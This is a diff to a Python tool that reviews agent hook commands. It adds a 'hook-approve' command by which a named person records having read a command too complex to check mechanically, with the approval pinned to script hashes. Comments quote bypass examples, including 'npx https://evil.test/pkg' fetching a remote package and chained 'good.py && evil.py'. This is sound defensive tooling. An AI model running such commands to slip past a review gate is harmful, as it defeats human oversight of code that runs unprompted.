@@ -1615,6 +1615,65 @@ def cmd_mcp_review(args) -> int:
     return 1 if any(r.exit_code == 1 for r in reps) else 3
 
 
+def cmd_hook_approve(args) -> int:
+    """Record that a PERSON read a hook command a machine cannot. Never that a command is safe.
+
+    The note on `check_hooks` says there is no acceptance path for hooks, and why: the first
+    version read an `accepted` map from the lock, a key nothing ever wrote, with no `--by` and
+    outside the `ask` prompt. That stays true of the RULES — H1, H2, H5 and the rest block here as
+    anywhere, approved shape or not, and this command refuses while any of them is outstanding.
+    What it clears is H12 only: the shape nobody can read mechanically, which without a door would
+    be a permanent finding, and a permanent finding is one people learn to scroll past."""
+    root = args.root.resolve()
+    lock = load_lock(root)
+    if lock is None:
+        print(f"no {LOCK} — run `registry_intake.py setup {root}` first", file=sys.stderr)
+        return 1
+    entries, unreadable = hook_entries(root)
+    if unreadable:
+        for rel, why in unreadable:
+            print(f"refused: {rel} does not parse ({why}) — nothing in it was reviewed", file=sys.stderr)
+        return 1
+    targets = [(rel, event, command, why) for rel, event, command in entries
+               if (why := reviewable_shape(root, command)) is not None
+               and (not args.only or args.only in command)]
+    if not targets:
+        print("nothing to approve: every hook command is in the shape a machine can read"
+              + (f" (nothing matched --only {args.only})" if args.only else ""))
+        return 0
+    blocking = [f for f in review_hooks(root, lock) if f.level == "block" and f.code != "H12"]
+    if blocking:
+        print("refused: a rule still blocks, and approving a SHAPE never approves a command:",
+              file=sys.stderr)
+        for f in blocking:
+            print(f"  {f.code} {f.item}: {f.message} — {f.where}", file=sys.stderr)
+        print("Fix those first; H12 is the only finding this command clears.", file=sys.stderr)
+        return 1
+    approved = (lock.setdefault("hooks", {})).setdefault("approved", {})
+    for rel, event, command, why in targets:
+        scripts, _ = hook_scripts(root, command)
+        here = root.resolve()
+        digests = {}
+        for q in scripts:
+            try:
+                if q.is_file() and q.resolve().is_relative_to(here):
+                    digests[q.resolve().relative_to(here).as_posix()] = sha256(q)
+            except OSError:
+                pass
+        print(f"\n{rel} · {event}\n  {command}\n  a machine cannot read it: {why}")
+        print("  pinned: " + (", ".join(f"{k} {v[:12]}…" for k, v in digests.items())
+                              if digests else "the command text only — it names no file of ours, so "
+                                              "what you read is the text"))
+        approved[hashlib.sha256(command.encode()).hexdigest()[:16]] = {
+            "command": command, "event": event, "file": rel, "why": why,
+            "by": args.by, "at": dt.datetime.now(dt.UTC).isoformat(timespec="seconds"),
+            "scripts": digests}
+    save_lock(root, lock)
+    print(f"\n✓ {len(targets)} hook command(s) recorded as read by {args.by}. Any edit to the text, "
+          "or to a pinned script, voids it and `check` blocks again.")
+    return 0
+
+
 def cmd_mcp_approve(args) -> int:
     root = args.root.resolve()
     lock = load_lock(root)
@@ -1704,6 +1763,8 @@ HOOK_CODES = {
     "H9": "a shell resolves this command and we cannot: what it runs was not reviewed",
     "H10": "the settings file does not parse — nothing in it was reviewed, and silence is not a pass",
     "H11": "an interpreter is named and we could not say which file it runs — nothing was read",
+    "H12": "not in the shape a machine can read, so nothing here was reviewed by one — a person "
+           "reads it, and `hook-approve --by <them>` records that they did",
 }
 
 # What the harness expands and `shlex` does not. A token still carrying any of these after our own
@@ -1821,11 +1882,12 @@ def inline_flags(name: str) -> tuple[str, ...] | None:
     return None
 
 
-def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path], list[tuple[str, str]]]:
-    """EVERY file a hook runs, not the first.
+def hook_tokens(root: Path, command: str) -> tuple[str, list[str], bool]:
+    """(the command with $CLAUDE_PROJECT_DIR expanded, its tokens, whether the quoting parsed).
 
-    The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
-    `good.py`. A command is a command line, not a command."""
+    ONE tokeniser, read by both the reader below and the recogniser after it. Two would be a parser
+    differential between the gate and the scanner, which is the whole family of defect this file
+    spent a week on."""
     # `${VAR}` is the form the harness expands and our first version did not: the token kept the
     # braces, the path could not exist, and the hook earned an H8 "missing" while the real script
     # ran unread. A false positive and a bypass in one line.
@@ -1838,9 +1900,22 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
         # splits `;`, `&`, `|`, `<`, `>` and parentheses out, which SEPARATORS below already reads.
         lex = shlex.shlex(expanded, posix=True, punctuation_chars=True)
         lex.whitespace_split = True
-        tokens = list(lex) if expanded.strip() else []
+        return expanded, (list(lex) if expanded.strip() else []), True
     except ValueError:            # an unbalanced quote: fall back to whitespace, never to silence
-        tokens = expanded.split()
+        return expanded, expanded.split(), False
+
+
+def is_pathish(root: Path, token: str) -> bool:
+    """A path has a separator, or a script extension, or exists here. An option's value does not."""
+    return "/" in token or bool(SCRIPT_EXT.search(token)) or (root / token).is_file()
+
+
+def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path], list[tuple[str, str]]]:
+    """EVERY file a hook runs, not the first.
+
+    The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
+    `good.py`. A command is a command line, not a command."""
+    expanded, tokens, _ok = hook_tokens(root, command)
     # `$HOME/bin/tool.sh` is ordinary and a reader can judge it; a command that COMPUTES what it
     # runs cannot be judged by anyone, so the pair carries which kind this is.
     if SUBSTITUTION.search(expanded):
@@ -1862,10 +1937,6 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
             seen.add(path.as_posix())
             out.append(path)
         return True
-
-    def is_path(token: str) -> bool:
-        """A path has a separator, or a script extension, or exists here. An option's value does not."""
-        return "/" in token or bool(SCRIPT_EXT.search(token)) or (root / token).is_file()
 
     # TWO variables, not one. `interp` raised the H11 gap AND gated the URL finding, so suppressing
     # it to quieten `pnpm build` also silenced `npx https://evil.test/pkg` — `([], [])` again. Every
@@ -1978,17 +2049,82 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
             # start with `./` — `.claude/hooks/tool` is how our own hooks are written, and demanding
             # an explicit prefix here lost the script instead of the note.
             fetch_operand = False
-            if PACKAGE_SPEC.fullmatch(token) or not is_path(token):
+            if PACKAGE_SPEC.fullmatch(token) or not is_pathish(root, token):
                 resolved = True        # a package, named: the note stands and no path is invented
                 continue
             fetcher = None
-        took = is_path(token) and add(token)
+        took = is_pathish(root, token) and add(token)
         resolved = took or resolved
     close_segment()
     return out, unresolved
 
 
-def review_hooks(root: Path) -> list[Finding]:
+# THE SHAPE A MACHINE CAN READ. Eleven findings in one week came out of trying to understand any
+# shell command a hook might hold, and the cause was never the individual pattern: a heuristic over
+# an unbounded grammar has no last bug. This is the other direction — a RECOGNISER, not a parser.
+# One interpreter (or one script), one file inside the project, plain arguments, nothing else.
+# Measured before it was written: all 46 hook commands across the 16 projects that have any — ours
+# and the hand-written `node "$CLAUDE_PROJECT_DIR"/scripts/guard/primitives-guard.mjs pre` — match
+# it. So the gate costs nothing today and bounds the problem for good.
+#
+# What it does NOT do is replace the rules. H1, H2, H5 and the rest still read the command's text
+# and still block, approved shape or not: `hook-approve` records that a person read an UNREADABLE
+# shape, never that a dangerous command is fine.
+PLAIN_ARG = re.compile(r"[\w.@:=+-]+")
+REDIRECT = re.compile(r"[<>]")
+
+
+def reviewable_shape(root: Path, command: str) -> str | None:
+    """None when a machine can say what this command runs; otherwise why it cannot."""
+    if SUBSTITUTION.search(command):
+        return "it computes what it runs (`$(…)` or a backtick)"
+    _expanded, tokens, parsed = hook_tokens(root, command)
+    if not parsed:
+        return "its quoting does not parse, so its tokens are a guess"
+    if not tokens:
+        return "it is empty"
+    if any(t in SEPARATORS for t in tokens):
+        return "it chains more than one command"
+    if any(REDIRECT.search(t) for t in tokens):
+        return "it redirects"
+    if any(REMOTE_SPEC.search(t) for t in tokens):
+        return "it names a URL or a remote package spec"
+    prog, rest = tokens[0], tokens[1:]
+    flags = inline_flags(Path(prog).name)
+    if flags is None and not is_pathish(root, prog):
+        return f"`{prog}` is neither an interpreter we know nor a file here"
+    if flags and any(t in flags for t in rest):
+        return "it carries its code on the command line"
+    scripts, unresolved = hook_scripts(root, command)
+    if unresolved:
+        return unresolved[0][0]
+    if len(scripts) != 1:
+        return f"{len(scripts)} files run here, not one" if scripts else "no file resolved"
+    try:
+        inside = scripts[0].resolve().is_relative_to(root.resolve())
+    except OSError:
+        inside = False
+    if not inside:
+        return f"{scripts[0]} is outside the project"
+    for t in rest:
+        if t is not prog and not is_pathish(root, t) and not PLAIN_ARG.fullmatch(t):
+            return f"`{t}` is not a plain argument"
+    return None
+
+
+def approved_shape(lock: dict | None, root: Path, command: str) -> dict | None:
+    """The recorded approval for this exact command, if its scripts are still the approved bytes."""
+    entry = ((lock or {}).get("hooks") or {}).get("approved", {}).get(hashlib.sha256(command.encode()).hexdigest()[:16])
+    if not entry or entry.get("command") != command:
+        return None
+    for rel, digest in (entry.get("scripts") or {}).items():
+        f = root / rel
+        if not f.is_file() or sha256(f) != digest:
+            return None          # the script changed after the person read it: the approval dies
+    return entry
+
+
+def review_hooks(root: Path, lock: dict | None = None) -> list[Finding]:
     found: list[Finding] = []
     entries, unreadable = hook_entries(root)
     for rel, why in unreadable:
@@ -1996,6 +2132,11 @@ def review_hooks(root: Path) -> list[Finding]:
     for rel, event, command in entries:
         where = f"{rel} · {event}"
         seen: set[str] = set()
+        if (why := reviewable_shape(root, command)) is not None:
+            ok = approved_shape(lock, root, command)
+            found.append(Finding("H12", "info" if ok else "block", event,
+                                 HOOK_CODES["H12"] + (f" — read by {ok['by']} on {ok['at'][:10]}" if ok else ""),
+                                 f"{where}: {why} · {command[:110]}"))
         for code, level, pat in HOOK_RULES:
             if pat.search(command) and code not in seen:
                 seen.add(code)
@@ -2093,7 +2234,7 @@ def check_hooks(root: Path, lock: dict) -> list[str]:
     without the agent choosing to, that is a hand edit away from silence. A blocking hook finding
     is fixed, not waved through; if acceptance is ever needed it gets a real command with `--by`."""
     return [f"hook {f.code} ({f.item}): {f.message} — {f.where}"
-            for f in review_hooks(root) if f.level == "block"]
+            for f in review_hooks(root, lock) if f.level == "block"]
 
 
 HOOK_COPY = ".claude/hooks/registry_intake.py"
@@ -2758,9 +2899,14 @@ def hook_ask(payload: dict) -> str | None:
     # otherwise match its variable-prefix arm). It has to cover the form this skill's own docs use —
     # `S=…/registry_intake.py` then `python3 $S approve …` — where the command string never contains
     # the script's name. A python interpreter plus one of the three verbs is that form.
-    if "registry_intake" not in command and not re.search(r"\bpython3?\b[^\n]*\b(?:skill-approve|mcp-approve|allow|approve)\b", command):
+    if "registry_intake" not in command and not re.search(r"\bpython3?\b[^\n]*\b(?:skill-approve|mcp-approve|hook-approve|allow|approve)\b", command):
         return None
     asks = []
+    if re.search(r"\bhook-approve\b", command):
+        by = re.search(r"--by[= ]+(\"[^\"]*\"|'[^']*'|\S+)", command)
+        asks.append("record that " + (by.group(1).strip("\"'") if by else "nobody named")
+                    + " READ a hook command a machine cannot — the one thing that runs without the "
+                      "agent choosing to")
     for verb, target in DECISION_CALL.findall(command):
         by = re.search(r"--by[= ]+(\"[^\"]*\"|'[^']*'|\S+)", command)
         who = by.group(1).strip("\"'") if by else "nobody named"
@@ -2865,6 +3011,9 @@ def main(argv: list[str] | None = None) -> int:
     s.add_argument("--by", required=True); s.add_argument("--accept", action="append")
     s.add_argument("--source"); s.add_argument("--note")
     s = sub.add_parser("hook-review"); s.add_argument("root", type=Path); s.add_argument("--json", action="store_true")
+    s = sub.add_parser("hook-approve"); s.add_argument("root", type=Path)
+    s.add_argument("--by", required=True, help="the person who read the command — not the agent")
+    s.add_argument("--only", help="approve just the commands containing this text")
     s = sub.add_parser("mcp-review"); s.add_argument("root", type=Path); s.add_argument("name", nargs="?")
     s.add_argument("--json", action="store_true")
     s = sub.add_parser("mcp-approve"); s.add_argument("root", type=Path); s.add_argument("name")
@@ -2898,7 +3047,7 @@ def main(argv: list[str] | None = None) -> int:
             "install": cmd_install, "caps": cmd_caps, "hook": cmd_hook, "hook-post": cmd_hook_post,
             "skill-review": cmd_skill_review, "skill-approve": cmd_skill_approve,
             "mcp-review": cmd_mcp_review, "mcp-approve": cmd_mcp_approve,
-            "hook-review": cmd_hook_review}[args.cmd](args)
+            "hook-review": cmd_hook_review, "hook-approve": cmd_hook_approve}[args.cmd](args)
 
 
 if __name__ == "__main__":
